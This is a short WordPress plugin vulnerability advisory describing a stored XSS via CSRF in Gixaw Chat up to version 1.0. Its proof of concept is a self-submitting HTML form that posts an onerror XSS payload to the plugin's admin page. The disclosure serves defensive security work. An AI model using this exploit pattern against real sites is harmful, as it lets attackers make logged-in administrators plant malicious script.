## WordPress Plugin Vulnerabilities

# Gixaw Chat <= 1.0 - Stored XSS via CSRF

### Description

The plugin does not have CSRF check in some places, and is missing sanitisation as well as escaping, which could allow attackers to make logged in admin add Stored XSS payloads via a CSRF attack.

### Proof of Concept

Have a logged in admin open an HTML file containing:
```
<form action="https://example.com/wp-admin/admin.php?page=gixaw-chat%2Fgixaw-chat.php" method="POST">
<input type="text" name="chat-name" value='"><img src=x onerror=alert(1)>'>
<input type="text" name="chat-subdomain" value="demo">
<input type="text" name="action" value="update">
</form>
<script>
document.forms[0].submit();
</script>
```
